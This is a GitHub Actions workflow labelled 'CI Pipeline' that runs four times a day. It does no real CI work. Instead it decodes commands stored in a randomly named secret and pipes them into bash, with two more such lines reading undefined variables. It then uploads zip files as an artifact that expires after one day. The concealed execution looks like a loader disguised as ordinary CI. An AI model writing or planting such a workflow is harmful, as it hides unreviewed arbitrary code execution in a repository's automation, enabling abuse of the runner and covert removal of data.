name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '4 3,9,15,21 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          tcted6997: ${{ secrets.tcted6997 }}
        run: |
          printf '%s' "$tcted6997" | jq -r .rg16712 | /bin/bash
          echo $mxxxp0619 | jq -r .h3 | /bin/bash
          printf '%s' "$pud60667" | jq -r .epon90728 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: Act3QsxC
          path: "*.zip"
          retention-days: 1
